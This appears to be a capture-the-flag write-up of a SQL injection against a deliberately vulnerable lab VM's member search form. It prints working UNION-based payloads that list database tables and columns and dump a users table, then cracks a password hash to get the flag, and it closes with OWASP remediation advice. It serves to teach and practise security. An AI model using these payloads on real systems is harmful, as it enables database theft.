# SQL Injection (MEMBERS)

On [Members page](http://192.168.56.101/index.php?page=member) a form allows to search information on a given member using its ID number.
<details>
<summary>IDs 0 to 5</summary>

![id0to5](https://user-images.githubusercontent.com/22397481/207928622-834fdf21-ae87-47c8-bca3-e282f4c82a5c.gif)
</details>

Let's see if we can attack this page with SQL Injection technique, by putting a `'`, a quote character. (if the error message like below prints, it means the environment is vulnerable for SQL Injection)

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'' at line 1
```

with this error message we are getting, we could try using the attack queries to see if we can get the informations, with understanding of following information:

- [Understanding MariaDB Architecture](https://mariadb.com/kb/en/understanding-mariadb-architecture/#:~:text=MariaDB%20does%20not%20support%20the,table%20they%20have%20permissions%20for.)
- [SQL UNION Operator](https://www.w3schools.com/sql/sql_union.asp)

So by it means, in `information_schema`, all the information of the databases can be found, and by quering to it directly, it will be possible to get information of databases, with using `UNION` operator, there is a chance a query can retrieve data from `information_schema`. There are [lists of tables](https://dev.mysql.com/doc/refman/8.0/en/general-information-schema-tables.html), and we are going to use couple of them


Following query will bring the information of all the tables created on the database
```
1 AND 1=1 UNION SELECT 1, table_name FROM information_schema.tables
```
and with the list of [General Table](https://dev.mysql.com/doc/refman/8.0/en/information-schema-general-table-reference.html), we can find the table `users` is listed on the result.

From running this query, we can grab all the column names from each table, as well.

```
1 AND 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
```
by searching the `users`, following columns are exist on the table `users`

```
user_id, first_name, last_name, town, country, planet, Commentaire, countersign
```

By tring all the columns, with using columns `Commentaire`, and `Countersign`, the following message can be reterived, with this query

```
1 AND 1=1 UNION SELECT Commentaire, countersign FROM users
```
![1 AND 1=1 UNION SELECT Commentaire, countersign FROM users](https://user-images.githubusercontent.com/22397481/209451385-c97a6a2b-0a89-440d-810d-5262b6d63877.jpeg)

as it shows, let's decrypt the password
```
ID: 1 AND 1=1 UNION SELECT Commentaire, countersign FROM users
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```
Following the instruction, convert the string to lowercase and compute SHA256 digests.
```shell
┌──$ [~/42/2022/darkly]
└─>  echo -n FortyTwo | tr -s A-Z a-z | openssl dgst -sha256
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```


## Remediation
A SQL Injection is an attack of injectin query through the input data from the client to the application. It can cause modify, removal, or admin operation to the databases. This can happen when unintended data enters a program from an untrusted source, or the data is used to dynamically construct a SQL query.

In order to prevent,

- Use of Prepare Statements (with Parameterized Queries)
- Use of properly construed stored Procedures
- Allow-list input valiation
- Escaping All User Supplied Input

See More:

- [SQL Injection | OWASP Foundation](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Prevention - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
